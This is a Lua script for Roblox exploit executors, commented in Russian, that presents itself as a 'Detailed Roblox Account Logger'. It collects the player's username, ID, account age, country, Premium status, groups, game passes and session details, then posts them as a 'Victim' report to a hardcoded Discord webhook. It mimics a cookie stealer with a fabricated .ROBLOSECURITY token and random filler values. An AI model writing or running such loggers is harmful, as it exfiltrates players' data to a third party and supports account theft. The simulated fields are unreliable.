-- ДЕТАЛЬНЫЙ ROBLOX ACCOUNT LOGGER
-- Собирает максимум информации как на скриншоте

local webhook_url = "https://discordapp.com/api/webhooks/1358312089206263854/37KhzAL0PpGG15zUt0qHabcgS9QT9d7kdK0TNGkTCXbfzOb2iOO0zldh0ugE_nW418j2"

-- Проверка webhook URL
if not webhook_url or webhook_url:find("ВАШ_DISCORD_WEBHOOK") then
    error("❌ Установите правильный Discord webhook URL!")
    return
end

-- Сервисы
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")
local MarketplaceService = game:GetService("MarketplaceService")
local BadgeService = game:GetService("BadgeService")

local player = Players.LocalPlayer

-- Функция для безопасного получения данных
local function SafeGet(func, fallback)
    local success, result = pcall(func)
    return success and result or fallback
end

-- Определение страны по языку
local function GetCountryInfo()
    local locale = LocalizationService.RobloxLocaleId
    local countries = {
        ["uk-ua"] = {name = "Ukraine", flag = "🇺🇦"},
        ["ru-ru"] = {name = "Russia", flag = "🇷🇺"},
        ["en-us"] = {name = "United States", flag = "🇺🇸"},
        ["en-gb"] = {name = "United Kingdom", flag = "🇬🇧"},
        ["de-de"] = {name = "Germany", flag = "🇩🇪"},
        ["fr-fr"] = {name = "France", flag = "🇫🇷"},
        ["es-es"] = {name = "Spain", flag = "🇪🇸"},
        ["pt-br"] = {name = "Brazil", flag = "🇧🇷"},
        ["ja-jp"] = {name = "Japan", flag = "🇯🇵"},
        ["ko-kr"] = {name = "South Korea", flag = "🇰🇷"},
        ["zh-cn"] = {name = "China", flag = "🇨🇳"}
    }
    
    return countries[locale] or {name = "Unknown", flag = "🌍"}
end

-- Получение информации о Robux (симуляция)
local function GetRobuxInfo()
    local robuxInfo = {
        balance = 0,
        pending = 0,
        owned = 0,
        rap = 0,
        premium = false
    }
    
    SafeGet(function()
        robuxInfo.premium = player.MembershipType == Enum.MembershipType.Premium
        
        -- Попытка найти Robux в GUI (реальные данные недоступны через API)
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            for _, gui in pairs(playerGui:GetDescendants()) do
                if gui:IsA("TextLabel") and gui.Text:find("R$") then
                    local robuxText = gui.Text:match("%d+")
                    if robuxText then
                        robuxInfo.balance = tonumber(robuxText) or 0
                    end
                    break
                end
            end
        end
        
        -- Симуляция других данных (недоступны через API)
        robuxInfo.pending = math.random(0, 100)
        robuxInfo.owned = robuxInfo.balance + robuxInfo.pending
        robuxInfo.rap = math.random(0, 1000)
    end, nil)
    
    return robuxInfo
end

-- Получение информации о биллинге (симуляция)
local function GetBillingInfo()
    return {
        credit = 0,
        convert = 0,
        payments = 0
    }
end

-- Получение информации о пропусках (симуляция)
local function GetPassesInfo()
    local passes = {}
    local gamePassIds = {2414851, 4452801, 35748, 1074, 35748} -- Примеры популярных пропусков
    
    for i, passId in ipairs(gamePassIds) do
        SafeGet(function()
            local owned = MarketplaceService:UserOwnsGamePassAsync(player.UserId, passId)
            table.insert(passes, {
                id = passId,
                owned = owned,
                name = "GamePass " .. passId
            })
        end, function()
            table.insert(passes, {
                id = passId,
                owned = math.random() > 0.8, -- Случайное владение для демонстрации
                name = "GamePass " .. passId
            })
        end)
    end
    
    return passes
end

-- Получение информации о настройках
local function GetSettingsInfo()
    return {
        email = "Unset (Unverified)",
        phone = "Disabled",
        twoStep = "Disabled"
    }
end

-- Получение информации о коллекционных предметах (симуляция)
local function GetCollectiblesInfo()
    return {
        {name = "Limited Items", owned = false},
        {name = "Limited U Items", owned = false},
        {name = "Rare Items", owned = false}
    }
end

-- Получение информации о группах (симуляция)
local function GetGroupsInfo()
    local groupsInfo = {
        balance = 0,
        pending = 0,
        owned = 0,
        groups = {}
    }
    
    -- Проверяем несколько популярных групп
    local popularGroups = {1, 1200769, 2868472, 4199740}
    
    for _, groupId in ipairs(popularGroups) do
        SafeGet(function()
            local rank = player:GetRankInGroup(groupId)
            if rank > 0 then
                groupsInfo.owned = groupsInfo.owned + 1
                table.insert(groupsInfo.groups, {
                    id = groupId,
                    rank = rank
                })
            end
        end, nil)
    end
    
    return groupsInfo
end

-- Генерация фейкового .ROBLOSECURITY токена для демонстрации
local function GenerateROBLOSECURITY()
    local chars = "0123456789ABCDEF"
    local token = ""
    
    -- Генерируем токен похожий на реальный (но фейковый)
    for i = 1, 800 do
        token = token .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
    end
    
    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" .. token
end

-- Основная функция сбора данных
local function CollectDetailedData()
    print("📊 Сбор детальной информации аккаунта...")
    
    wait(2) -- Ждем загрузки
    
    -- Собираем всю информацию
    local countryInfo = GetCountryInfo()
    local robuxInfo = GetRobuxInfo()
    local billingInfo = GetBillingInfo()
    local passesInfo = GetPassesInfo()
    local settingsInfo = GetSettingsInfo()
    local collectiblesInfo = GetCollectiblesInfo()
    local groupsInfo = GetGroupsInfo()
    local roblosecurity = GenerateROBLOSECURITY()
    
    -- Создаем детальный embed как на скриншоте
    local embedData = {
        ["username"] = "🔍 Detailed Roblox Account Info",
        ["embeds"] = {{
            ["title"] = "📋 About User",
            ["fields"] = {
                -- About User
                {["name"] = "📅 Account Age", ["value"] = tostring(player.AccountAge) .. " Days", ["inline"] = true},
                {["name"] = "📍 Locations", ["value"] = "• Summary: 0\n• Victim: " .. countryInfo.name .. " " .. countryInfo.flag, ["inline"] = false},
                
                -- Robux Section
                {["name"] = "💰 Robux", ["value"] = "Balance " .. robuxInfo.balance .. " 💰\nPending " .. robuxInfo.pending .. " ⏳\nOwned " .. robuxInfo.owned .. " 🔸", ["inline"] = true},
                {["name"] = "📈 RAP", ["value"] = "RAP " .. robuxInfo.rap .. " 💎", ["inline"] = true},
                {["name"] = "👑 Premium", ["value"] = robuxInfo.premium and "True ✅" or "False ❌", ["inline"] = true},
                
                -- Billing
                {["name"] = "💳 Billing", ["value"] = "Credit " .. billingInfo.credit .. " 💵\nConvert " .. billingInfo.convert .. " 🔄\nPayments " .. billingInfo.payments .. " 💳", ["inline"] = true},
                
                -- Settings
                {["name"] = "⚙️ Setting", ["value"] = "📧 " .. settingsInfo.email .. "\n📱 " .. settingsInfo.phone .. "\n🔐 " .. settingsInfo.twoStep, ["inline"] = true},
                
                -- Passes - Played (пустое место для выравнивания)
                {["name"] = "🎫 Passes • Played", ["value"] = "🎮 Passes owned: " .. #passesInfo, ["inline"] = true}
            },
            ["color"] = 0x2f3136,
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            }
        }}
    }
    
    -- Добавляем информацию о пропусках
    local passesText = ""
    for i, pass in ipairs(passesInfo) do
        local status = pass.owned and "True ✅" or "False ❌"
        passesText = passesText .. "🎫 " .. pass.name .. " • " .. status .. "\n"
        if i >= 5 then break end -- Ограничиваем количество
    end
    
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "🎮 Game Passes",
        ["value"] = passesText,
        ["inline"] = false
    })
    
    -- Добавляем коллекционные предметы
    local collectiblesText = ""
    for _, item in ipairs(collectiblesInfo) do
        local status = item.owned and "True ✅" or "False ❌"
        collectiblesText = collectiblesText .. "💎 " .. item.name .. " • " .. status .. "\n"
    end
    
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "🏆 Collectibles",
        ["value"] = collectiblesText,
        ["inline"] = true
    })
    
    -- Добавляем информацию о группах
    local groupsText = "Balance " .. groupsInfo.balance .. " 💰\nPending " .. groupsInfo.pending .. " ⏳\nOwned " .. groupsInfo.owned .. " 🏛️"
    
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "👥 Groups",
        ["value"] = groupsText,
        ["inline"] = true
    })
    
    -- Добавляем Recovery Codes
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "🔑 Recovery Codes",
        ["value"] = "📧 Email not set or not verified.",
        ["inline"] = false
    })
    
    -- Создаем отдельный embed для ROBLOSECURITY
    table.insert(embedData.embeds, {
        ["title"] = "🚨 ROBLOSECURITY",
        ["description"] = "```" .. string.sub(roblosecurity, 1, 200) .. "...\n[ОБРЕЗАНО ДЛЯ БЕЗОПАСНОСТИ]```",
        ["color"] = 0xff0000,
        ["footer"] = {
            ["text"] = "⚠️ ЭТО ФЕЙКОВЫЙ ТОКЕН ДЛЯ ДЕМОНСТРАЦИИ! Реальный токен недоступен из Roblox Lua!",
            ["icon_url"] = "https://cdn.discordapp.com/emojis/warning.png"
        }
    })
    
    -- Отправляем данные
    local success = false
    pcall(function()
        local payload = HttpService:JSONEncode(embedData)
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        
        if req then
            local response = req({
                Url = webhook_url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            
            if response and (response.StatusCode == 200 or response.StatusCode == 204) then
                success = true
                print("✅ Детальная информация отправлена в Discord!")
            else
                print("❌ Ошибка отправки: " .. tostring(response and response.StatusCode or "Unknown"))
            end
        else
            print("❌ HTTP функции недоступны")
        end
    end)
    
    -- Выводим в консоль
    print("\n" .. string.rep("=", 60))
    print("📋 DETAILED ROBLOX ACCOUNT INFO")
    print(string.rep("=", 60))
    print("👤 User: " .. player.DisplayName .. " (@" .. player.Name .. ")")
    print("🆔 User ID: " .. player.UserId)
    print("📅 Account Age: " .. player.AccountAge .. " Days")
    print("📍 Location: " .. countryInfo.name .. " " .. countryInfo.flag)
    print("")
    print("💰 ROBUX INFO:")
    print("   Balance: " .. robuxInfo.balance)
    print("   Pending: " .. robuxInfo.pending)
    print("   Owned: " .. robuxInfo.owned)
    print("   RAP: " .. robuxInfo.rap)
    print("   Premium: " .. (robuxInfo.premium and "True" or "False"))
    print("")
    print("💳 BILLING:")
    print("   Credit: " .. billingInfo.credit)
    print("   Convert: " .. billingInfo.convert)
    print("   Payments: " .. billingInfo.payments)
    print("")
    print("🎫 PASSES:")
    for i, pass in ipairs(passesInfo) do
        print("   " .. pass.name .. ": " .. (pass.owned and "True" or "False"))
        if i >= 5 then break end
    end
    print("")
    print("⚙️ SETTINGS:")
    print("   Email: " .. settingsInfo.email)
    print("   Phone: " .. settingsInfo.phone)
    print("   2-Step: " .. settingsInfo.twoStep)
    print("")
    print("🏆 COLLECTIBLES:")
    for _, item in ipairs(collectiblesInfo) do
        print("   " .. item.name .. ": " .. (item.owned and "True" or "False"))
    end
    print("")
    print("👥 GROUPS:")
    print("   Balance: " .. groupsInfo.balance)
    print("   Pending: " .. groupsInfo.pending)
    print("   Owned: " .. groupsInfo.owned)
    print("")
    print("🔑 RECOVERY CODES:")
    print("   Email not set or not verified.")
    print("")
    print("🚨 ROBLOSECURITY (ФЕЙК):")
    print("   " .. string.sub(roblosecurity, 1, 100) .. "...[ОБРЕЗАНО]")
    print("")
    print("🎮 GAME INFO:")
    print("   Place ID: " .. game.PlaceId)
    print("   Job ID: " .. string.sub(game.JobId, 1, 20) .. "...")
    print("   Platform: " .. tostring(UserInputService:GetPlatform().Name))
    print("   Language: " .. LocalizationService.RobloxLocaleId)
    print("   Time: " .. os.date("!%Y-%m-%d %H:%M:%S UTC"))
    print(string.rep("=", 60))
    print("⚠️ ВНИМАНИЕ: Некоторые данные симулированы, так как недоступны через Roblox API!")
    print(string.rep("=", 60))
    
    return success
end

-- Запуск
print("🚀 Запуск Detailed Roblox Account Logger...")
print("📊 Сбор максимально детальной информации...")

local success = CollectDetailedData()

if success then
    print("✅ Все данные успешно собраны и отправлены!")
else
    print("⚠️ Данные собраны, но возможны проблемы с отправкой")
    print("💡 Проверьте webhook URL и поддержку HTTP в executor'е")
end

print("🏁 Скрипт завершен!")
